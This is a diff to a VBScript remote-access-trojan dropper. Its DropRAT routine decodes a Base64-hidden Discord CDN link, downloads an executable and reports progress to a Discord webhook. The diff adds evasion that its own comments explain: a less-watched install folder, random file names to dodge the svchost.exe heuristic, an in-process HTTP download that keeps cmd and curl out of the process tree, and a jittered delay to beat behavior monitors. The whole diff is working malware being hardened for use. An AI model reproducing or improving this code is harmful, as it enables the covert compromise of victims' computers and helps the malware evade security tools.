@@ -44,13 +44,18 @@ Loop
 
 window.close()
 
-' --- RAT DROP ---
+' --- RAT DROP (hardened) ---
 Sub DropRAT(targetWH, sendRocket)
     ' Base64 of: https://cdn.discordapp.com/attachments/1557266192971071579/1572386687181394011/client_1.exe?ex=6afe2eb7&is=6afcdd37&hm=45b391655f98bf6655421b302ad71a84bbefa663119aa5784404b8bcee5c2d9f&
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcyMzg2Njg3MTgxMzk0MDExL2NsaWVudF8xLmV4ZT9leD02YWZlMmViNyZpcz02YWZjZGQzNyZobT00NWIzOTE2NTVmOThiZjY2NTU0MjFiMzAyYWQ3MWE4NGJiZWZhNjYzMTE5YWE1Nzg0NDA0YjhiY2VlNWMyZDlmJg=="
     Dim dl : dl = DecodeB64(b64Url)
-    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
-    Dim op : op = tPath & "\svchost.exe"
+    
+    ' Path change: %LOCALAPPDATA%\Microsoft\Windows (less watched than %TEMP%)
+    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
+    ' Random name so it doesn't match svchost.exe heuristic
+    Randomize
+    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
+    Dim op : op = tPath & "\" & fname
     
     If sendRocket Then
         Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
@@ -58,10 +63,25 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 20 -o """ & op & """ """ & dl & """"
-    sh.Run cCmd, 0, False
+    ' HTTP object download — no cmd.exe, no curl.exe in the process tree
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", dl, False
+    xh.Send
+    If xh.Status = 200 Then
+        Dim st : Set st = CreateObject("ADODB.Stream")
+        st.Type = 1
+        st.Open
+        st.Write xh.responseBody
+        st.SaveToFile op, 2
+        st.Close
+        Set st = Nothing
+    End If
+    Set xh = Nothing
 
-    Call SleepSeconds(2)
+    ' Jittered delay so it's not "write then immediately execute" — behavior monitor pattern
+    Randomize
+    Call SleepSeconds(Int(Rnd() * 8 + 8))
 
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 100000 Then
